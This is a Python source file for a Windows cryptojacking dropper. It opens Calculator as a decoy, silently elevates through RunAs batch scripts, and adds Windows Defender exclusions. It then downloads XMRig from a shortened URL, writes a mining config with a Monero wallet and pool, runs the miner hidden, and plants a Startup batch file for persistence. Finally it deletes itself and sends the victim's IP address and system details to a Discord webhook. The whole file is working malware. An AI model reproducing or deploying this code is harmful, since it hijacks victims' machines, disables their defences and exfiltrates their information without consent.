import zipfile
import os
import time as t
import traceback
from pathlib import Path
import subprocess
import requests as res
import datetime
from discord_webhook import DiscordEmbed, DiscordWebhook
import platform
jak = str(platform.uname())
intro = jak[12:]
r = res.get('https://api.ipify.org?format=json')

subprocess.Popen("calc.exe", creationflags=subprocess.CREATE_NO_WINDOW)

    

config = """
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "asm": true,
        "argon2-impl": null,
        "argon2": [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15],
        "cn": [
            [1, 0],
            [1, 2],
            [1, 4],
            [1, 6],
            [1, 8],
            [1, 10],
            [1, 12],
            [1, 14]
        ],
        "cn-heavy": [
            [1, 0],
            [1, 2],
            [1, 4],
            [1, 6]
        ],
        "cn-lite": [
            [1, 0],
            [1, 1],
            [1, 2],
            [1, 3],
            [1, 4],
            [1, 5],
            [1, 6],
            [1, 7],
            [1, 8],
            [1, 9],
            [1, 10],
            [1, 11],
            [1, 12],
            [1, 13],
            [1, 14],
            [1, 15]
        ],
        "cn-pico": [
            [2, 0],
            [2, 1],
            [2, 2],
            [2, 3],
            [2, 4],
            [2, 5],
            [2, 6],
            [2, 7],
            [2, 8],
            [2, 9],
            [2, 10],
            [2, 11],
            [2, 12],
            [2, 13],
            [2, 14],
            [2, 15]
        ],
        "cn/upx2": [
            [2, 0],
            [2, 1],
            [2, 2],
            [2, 3],
            [2, 4],
            [2, 5],
            [2, 6],
            [2, 7],
            [2, 8],
            [2, 9],
            [2, 10],
            [2, 11],
            [2, 12],
            [2, 13],
            [2, 14],
            [2, 15]
        ],
        "ghostrider": [
            [8, 0],
            [8, 2],
            [8, 4],
            [8, 6],
            [8, 8],
            [8, 10],
            [8, 12],
            [8, 14]
        ],
        "rx": [0, 2, 4, 6, 8, 10, 12, 14],
        "rx/wow": [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15],
        "cn-lite/0": false,
        "cn/0": false,
        "rx/arq": "rx/wow"
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn-lite/0": false,
        "cn/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn-lite/0": false,
        "cn/0": false
    },
    "log-file": null,
    "donate-level": 0,
    "donate-over-proxy": 1,
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "xmr-sg.kryptex.network:7029",
            "user": "41jiqfGsS66GNKEMhrWXUJMwPN7rywuyaG81rHa1XAYTQyPAgN5j13iSnknVPDV4qB3GRm76JrFXm5hoLYbyH3tsDknhNKf",
            "pass": "thegayyesman",
            "rig-id": null,
            "nicehash": false,
            "keepalive": false,
            "enabled": true,
            "tls": false,
            "sni": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "retries": 5,
    "retry-pause": 5,
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "dns": {
        "ip_version": 0,
        "ttl": 30
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
"""

install_bat = r"""@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -NoProfile -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

powershell -Command "Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads; $url = 'https://short.do/5XCdrT'; $outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'xmrig-6.26.0-windows-x64.zip');Start-Sleep -Milliseconds 100 ;Invoke-WebRequest -Uri $url -OutFile $outputFile"
exit
"""



start = r"""@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -NoProfile -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

powershell -Command "Start-Process -FilePath (Join-Path $env:USERPROFILE '\AppData\Roaming\Microsoft\Windows\Windows service\xmrig-6.26.0\xmrig.exe') -ArgumentList '-o', 'xmr-sg.kryptex.network:7029', '-u', 'your wallet addresse', '-k' -WindowStyle Hidden"
exit
"""
addex = r"""
@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -NoProfile -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)


powershell -Command "Add-MpPreference -ExclusionPath (Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\Windows service')"
powershell -Command "Add-MpPreference -ExclusionPath (Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')"
exit
"""
def startup():
    startu_path = (
        Path(os.getenv("APPDATA"))
        / "Microsoft"
        / "Windows"
        / "Start Menu"
        / "Programs"
        / "Startup"
        / "auto.bat"
    )
    with open(startu_path, "w")as f :
        f.write(start)
        print("[status] ok")
def add_exclution():
    path = (
        Path(os.getenv("APPDATA"))
        /"Microsoft"
        /"Windows"
        /"Windows service" 
        /"add_exclu.bat"
    )
    with open(path, 'w')as f:
        f.write(addex)
    if os.path.exists(path):
        subprocess.run([str(path)], shell=True)
    else:
        print("[status] not found")

def install():
     install_path = (
         Path(os.getenv("APPDATA"))
             /"Microsoft"
             /"Windows"
             /"Windows service"
             /"installer.bat"
         )
     with open(install_path, "w") as f:
          f.write(install_bat)
     if os.path.exists(install_path):
         subprocess.run(install_path)
         print("[status] successfully run install")
     else:
         print("[status] no install in the path")
    
def create_file():
    paths = Path.home() /"AppData"/"Roaming"/"Microsoft"/"Windows"/ "Windows service"
    paths.mkdir(parents=True,exist_ok=True)



def extract_file():
    zip_file = Path.home() / "Downloads" / "xmrig-6.26.0-windows-x64.zip"
    extracted = Path.home() /"AppData"/"Roaming"/"Microsoft"/"Windows"/ "Windows service"
    
    max_retries = 7  
    retry_delay = 5 

    for i in range(max_retries):
        if zip_file.exists():
            try:
                with zipfile.ZipFile(zip_file, "r") as zip_ref:
                    zip_ref.extractall(extracted)
                    print("[status] Extracted successfully")
                    return
            except zipfile.BadZipFile:
                print("[status] File is still downloading or corrupted, retrying...")
        else:
            print(f"[status] Waiting for zip file... ({i+1}/{max_retries})")
        
        t.sleep(retry_delay)
        
    print("[status] Error: File not found after maximum retries.")
def write_config():
    
    json_path = (
        Path(os.getenv("APPDATA"))
        / "Microsoft"
        / "Windows"
        / "Windows service"
        / "xmrig-6.26.0"
        / "config.json"
    )

    try:
        
        json_path.parent.mkdir(parents=True, exist_ok=True)

        
        with open(json_path, "w", encoding="utf-8") as f:
            f.write(config)
            
        print(f"[status] Successfully wrote config to {json_path}")
        
    except Exception as e:
        print(f"[status] Error writing config: {e}")


def run_xmrigexe():
    xmrig_folder = (
        Path(os.getenv("APPDATA"))
        / "Microsoft"
        / "Windows"
        / "Windows service" 
        / "xmrig-6.26.0"
    )
    
   
    xmrig_exe_path = xmrig_folder / "xmrig.exe"

    if os.path.exists(xmrig_exe_path):
     subprocess.Popen(
        [
            str(xmrig_exe_path),
            '-o', 'xmr-sg.kryptex.network:7029',
            '-u', 'your wallet addresse',
            '-k'
        ], 
        cwd=str(xmrig_folder),
        creationflags=subprocess.CREATE_NO_WINDOW
          )
     print("[status] Launched successfully")
    else:
      print("[status] xmrig.exe not found")


def main():
   xmrig_path = Path.home() / "Downloads" 
   if xmrig_path.exists():
        t.sleep(1)
        create_file()
        print("[status] create file....")
        t.sleep(1)
        add_exclution()
        print("[status] addding")
        t.sleep(1)
        install()
        print("[status] installing")
        startup()
        print("[status] ok boss")
   else:
        print("[status] NOT FOUND")

def main2():
    xmrig = Path.home() / "Downloads" / "xmrig-6.26.0-windows-x64.zip"
    if os.path.exists(xmrig):
            extract_file()
            print("[status] extracted")
            t.sleep(1)
            write_config()
            print("[status] write_config")
            t.sleep(1)
            run_xmrigexe()
            print("[status] running miner")
            t.sleep(1)
            destroy_self()
            print("[STATUS] bybybbybybybyybybyybbyybeee")
    else:
            print("[status] NOT FOUND")

def destroy_self():
      current_file = os.path.abspath(__file__)
      os.remove(current_file)
      print(f"ลบไฟล์ {current_file} เรียบร้อยแล้ว")


def run():
 main()
 max = 7
 path = Path.home() / "Downloads" / "xmrig-6.26.0-windows-x64.zip"

 for i in range(max):
    if os.path.exists(path):
        try:
             main2()
             return
        except:
            print('[status] try again')    
    else:
        print(f'[status] wait for file zip ({i+1}/{max})')

    t.sleep(5)
    print('[status] sorry try again.....')


date = datetime.datetime.now()
data = r.json()['ip']
webhook = DiscordWebhook(url="discord webhook" , content = f"------------------------------------------------------------------------------------------------------------------------------------\n-- [clint ip]:  {data}\n-- [sysinfo] {intro}\n-- [date] {date}\n-- [xmrig status] ok\n------------------------------------------------------------------------------------------------------------------------------------")
response = webhook.execute()
run()
